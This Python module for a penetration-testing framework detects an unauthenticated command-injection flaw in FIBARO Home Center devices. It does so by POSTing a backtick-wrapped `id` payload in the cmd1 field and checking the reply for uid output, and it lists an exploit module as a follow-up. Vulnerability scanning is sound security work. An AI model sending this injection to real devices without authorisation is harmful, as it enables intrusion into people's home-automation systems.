#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""FIBARO Home Center liliSetDeviceCommand.php RCE."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'FIBARO Home Center - liliSetDeviceCommand RCE Detection',
        'description': (
            'Detects unauthenticated command injection in FIBARO '
            '/services/liliSetDeviceCommand.php via cmd1 backticks.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'fibaro', 'iot', 'rce', 'cmdi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['exploits/linux/http/fibaro_home_center_rce'],
            },
        },
        'references': [
            'https://seclists.org/fulldisclosure/2017/Jun/30',
        ],
    }

    def run(self):
        data = (
            'deviceID=1&deviceName=&deviceType=&cmd1=`id${IFS}`&cmd2=&roomID=1'
            '&roomName=&sectionID=&sectionName=&lang=en'
        )
        r = self.http_request(
            method='POST',
            path='/services/liliSetDeviceCommand.php',
            data=data,
            headers={
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Fibaro-Version': '2',
                'X-Requested-With': 'XMLHttpRequest',
            },
            allow_redirects=False,
        )
        if not r:
            return False
        if re.search(r'uid=\d+.*gid=\d+', r.text or ''):
            self.set_info(
                severity='critical',
                reason='FIBARO Home Center command injection',
                path='/services/liliSetDeviceCommand.php',
            )
            return True
        return False
